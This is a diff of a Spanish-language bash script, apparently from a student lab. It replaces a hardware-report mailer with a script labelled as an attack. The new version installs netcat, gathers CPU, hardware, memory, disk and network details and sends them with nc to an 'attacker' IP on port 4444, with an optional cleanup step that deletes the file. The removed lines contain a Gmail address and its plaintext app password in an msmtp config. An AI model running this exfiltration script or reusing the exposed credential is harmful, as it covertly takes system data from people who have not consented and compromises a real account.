@@ -1,48 +1,60 @@
-sudo apt update
-sudo apt install lshw dmidecode pciutils
-sudo apt install mailutils
-sudo apt install msmtp msmtp-mta mailutils
-#instala complementos necesarios
-user=$(whoami) #le asigna a la variable user el nombre del usuario
+#!/bin/bash
+
+# -------------------------------
+# Configuración
+# -------------------------------
+ATACANTE_IP="192.168.244.128"
+PUERTO=4444
+ARCHIVO="datos.txt"
+
+# -------------------------------
+# Verificar e instalar herramientas necesarias
+# -------------------------------
+
+function instalar_si_falta() {
+    if ! command -v "$1" &> /dev/null; then
+        echo "[*] Instalando $1..."
+        sudo apt-get update && sudo apt-get install -y "$1"
+    else
+        echo "[*] $1 ya está instalado."
+    fi
+}
+
+instalar_si_falta "netcat"
+instalar_si_falta "lshw"
+instalar_si_falta "lscpu"
+
+# -------------------------------
+# Recolectar datos del sistema
+# -------------------------------
+
+echo "[*] Recolectando información del sistema..."
 {
-defaults
-auth           on
-tls            on
-tls_trust_file /etc/ssl/certs/ca-certificates.crt
-logfile        ~/.msmtp.log
+    echo "------ INFORMACIÓN DE CPU ------"
+    lscpu
+    echo -e "\n------ INFORMACIÓN DE HARDWARE ------"
+    sudo lshw -short
+    echo -e "\n------ INFORMACIÓN DE MEMORIA ------"
+    free -h
+    echo -e "\n------ INFORMACIÓN DEL DISCO ------"
+    df -h
+    echo -e "\n------ INFORMACIÓN DE RED ------"
+    ip a
+} > "$ARCHIVO"
 
-account        gmail
-host           smtp.gmail.com
-port           587
-from           gaspar.castro.utu@gmail.com
-user           gaspar.castro.utu@gmail.com
-password       foilbwtuwutzlxvw
+echo "[*] Datos recopilados en '$ARCHIVO'"
 
-account default : gmail
-} > ~/.msmtprc
-lscpu > cpu.txt #crea o sobreescribe el archivo cpu.txt con la informacion del procesador
+# -------------------------------
+# Enviar datos al atacante
+# -------------------------------
 
-{
-free -h
-cat /proc/meminfo
-} > ram.txt #crea o sobreescribe el archivo ram.txt con la informacion de la memoria RAM
+echo "[*] Enviando datos a $ATACANTE_IP:$PUERTO..."
+timeout 5 nc "$ATACANTE_IP" "$PUERTO" < $ARCHIVO
+echo "[*] Datos enviados con éxito."
 
-{
-lsblk
-df -h
-}> disk.txt #crea o sobreescribe el archivo disk.txt con la informacion del disco duro o la unidad de almacenamiento
+# -------------------------------
+# Limpieza opcional
+# -------------------------------
+# rm -f "$ARCHIVO"  # Descomentar para borrar los datos luego de enviarlos
 
-sudo dmidecode -t baseboard > mobo.txt #crea o sobreescribe el archivo mobo.txt con la informacion de la placa madre
-
-lspci | grep -i 'vga\|3d' > gpu.txt #crea o sobreescribe el archivo gpu.txt con la informacion de la tarjeta grafica
-
-{
-uname -a
-hostnamectl
-} > sysinf.txt #crea o sobreescribe el archivo sysinf.txt con la informacion del kernel, arquitectura, nombre del sistema y host.
-
-sudo lshw -short > summary.txt #crea o sobreescribe el archivo summary.txt con un resumen de la informacion del hardware
-
-tar -czvf hw.tar.gz cpu.txt gpu.txt ram.txt disk.txt sysinf.txt mobo.txt summary.txt
-
-echo "Informacion de hardware" | mail -s "Hardware $user" -A hw.tar.gz gaspar.castro.utu@gmail.com #manda por mail el archivo hw.tar.gz
+echo "[*] Instalación completada."
